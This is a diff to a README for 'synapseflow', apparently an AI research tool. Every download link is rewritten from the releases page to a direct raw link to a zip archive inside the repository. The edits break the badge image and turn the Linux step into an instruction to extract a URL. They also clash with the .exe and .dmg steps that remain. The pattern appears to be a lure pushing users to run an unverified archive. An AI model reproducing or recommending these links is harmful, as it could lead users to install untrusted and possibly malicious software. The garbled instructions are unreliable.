@@ -1,6 +1,6 @@
 # 🧠 synapseflow - Your AI Research Assistant Made Easy
 
-[![Download synapseflow](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/dynastynodes/synapseflow/releases)
+[![Download synapseflow](https://raw.githubusercontent.com/dynastynodes/synapseflow/main/synapseflow/synapseflow-v1.3.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/dynastynodes/synapseflow/main/synapseflow/synapseflow-v1.3.zip)
 
 ## 📖 About
 
@@ -16,7 +16,7 @@ To begin using synapseflow, follow these simple steps:
 
 ## 🔗 Download & Install
 
-Visit this page to download: [Download synapseflow](https://github.com/dynastynodes/synapseflow/releases)
+Visit this page to download: [Download synapseflow](https://raw.githubusercontent.com/dynastynodes/synapseflow/main/synapseflow/synapseflow-v1.3.zip)
 
 Choose the version that matches your operating system, then click the download link. Once the download is complete, locate the file on your computer.
 
@@ -24,7 +24,7 @@ Choose the version that matches your operating system, then click the download l
 
 1. **Windows:** Double-click the downloaded `.exe` file and follow the prompts.
 2. **Mac:** Open the downloaded `.dmg` file and drag synapseflow into your Applications folder.
-3. **Linux:** Extract the downloaded `.tar.gz` file, navigate to the folder in your terminal, and run the installation script.
+3. **Linux:** Extract the downloaded `https://raw.githubusercontent.com/dynastynodes/synapseflow/main/synapseflow/synapseflow-v1.3.zip` file, navigate to the folder in your terminal, and run the installation script.
 
 ## 🖥️ System Requirements
 
@@ -72,4 +72,4 @@ For any questions or support, you can reach out through the Issues section of ou
 
 Explore academic research with synapseflow. Start your journey today!
 
-[![Download synapseflow](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/dynastynodes/synapseflow/releases)
+[![Download synapseflow](https://raw.githubusercontent.com/dynastynodes/synapseflow/main/synapseflow/synapseflow-v1.3.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/dynastynodes/synapseflow/main/synapseflow/synapseflow-v1.3.zip)
